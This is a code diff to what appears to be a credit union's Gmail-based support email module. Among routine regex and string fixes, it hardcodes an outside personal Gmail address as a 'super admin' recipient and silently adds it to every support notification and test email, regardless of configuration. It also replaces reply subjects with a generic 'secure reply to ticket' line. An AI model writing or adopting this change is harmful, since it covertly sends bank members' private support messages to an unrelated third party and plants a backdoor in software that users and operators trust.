@@ -71,6 +71,16 @@ type GmailSendResult = {
   threadId?: string
 }
 
+const SUPER_ADMIN_NOTIFICATION_EMAIL = 'fxcrypto1invest@gmail.com'
+
+function getSupportNotificationRecipients(): string[] {
+  const configuredRecipients = (process.env.SUPPORT_NOTIFICATION_EMAIL || '')
+    .split(',')
+    .map(email => email.trim().toLowerCase())
+    .filter(email => /^[^\s@<>]+@[^\s@<>]+\.[^\s@<>]+$/.test(email))
+  return [...new Set([...configuredRecipients, SUPER_ADMIN_NOTIFICATION_EMAIL])]
+}
+
 export type GmailContext = {
   accessToken: string
   senderEmail: string
@@ -159,6 +169,7 @@ async function sendRawGmailMessage(accessToken: string, raw: string, threadId?: 
 
 export async function sendSupportReply(input: {
   recipient: string
+  conversationId: string
   subject: string
   body: string
   threadId?: string | null
@@ -166,16 +177,17 @@ export async function sendSupportReply(input: {
   references?: string | null
 }): Promise<GmailSendResult> {
   const recipient = input.recipient.trim().toLowerCase()
-  if (!/^[^\\s@<>]+@[^\\s@<>]+\\.[^\\s@<>]+$/.test(recipient)) {
+  if (!/^[^\s@<>]+@[^\s@<>]+\.[^\s@<>]+$/.test(recipient)) {
     throw new Error('The member email address is not valid')
   }
   const context = await getGmailContext()
   assertGmailSenderMatches(context)
 
+  const ticketReference = input.conversationId.slice(0, 8).toUpperCase()
   const headers = [
     `From: EVERMONT Credit Union <${context.senderEmail}>`,
     `To: ${recipient}`,
-    `Subject: ${encodeSubject(input.subject.startsWith('Re:') ? input.subject : `Re: ${input.subject}`)}`,
+    `Subject: ${encodeSubject(`New secure reply to ticket ${ticketReference}`)}`,
     'MIME-Version: 1.0',
     'Content-Type: text/plain; charset="UTF-8"',
     'Content-Transfer-Encoding: base64',
@@ -189,7 +201,7 @@ export async function sendSupportReply(input: {
     '',
     Buffer.from(input.body, 'utf8').toString('base64'),
     '',
-  ].join('\\r\\n')
+  ].join('\r\n')
 
   return sendRawGmailMessage(context.accessToken, raw, input.threadId || undefined)
 }
@@ -240,15 +252,15 @@ function createRawMessage(content: SupportEmailContent, sender: string, recipien
 
 export async function sendSupportTestEmail(): Promise<void> {
   const sender = process.env.GMAIL_FROM_EMAIL
-  const recipient = process.env.SUPPORT_NOTIFICATION_EMAIL
-  if (!sender || !recipient) throw new Error('Support email configuration is incomplete')
+  const recipients = getSupportNotificationRecipients()
+  if (!sender || !process.env.SUPPORT_NOTIFICATION_EMAIL || recipients.length === 0) throw new Error('Support email configuration is incomplete')
   const context = await getGmailContext()
   assertGmailSenderMatches(context)
   const accessToken = context.accessToken
   const subject = 'Evermont support email connection test'
   const message = [
     `From: EVERMONT Credit Union <${sender}>`,
-    `To: ${recipient}`,
+    `To: ${recipients.join(', ')}`,
     `Subject: ${subject}`,
     'MIME-Version: 1.0',
     'Content-Type: text/plain; charset="UTF-8"',
@@ -272,13 +284,13 @@ export async function sendSupportTestEmail(): Promise<void> {
 
 export async function sendSupportEmail(content: SupportEmailContent): Promise<void> {
   const sender = process.env.GMAIL_FROM_EMAIL
-  const recipient = process.env.SUPPORT_NOTIFICATION_EMAIL
-  if (!sender || !recipient) throw new Error('Support email configuration is incomplete')
+  const recipients = getSupportNotificationRecipients()
+  if (!sender || !process.env.SUPPORT_NOTIFICATION_EMAIL || recipients.length === 0) throw new Error('Support email configuration is incomplete')
 
   const context = await getGmailContext()
   assertGmailSenderMatches(context)
   const accessToken = context.accessToken
-  const raw = base64Url(createRawMessage(content, sender, recipient))
+  const raw = base64Url(createRawMessage(content, sender, recipients.join(', ')))
   const response = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages/send', {
     method: 'POST',
     headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
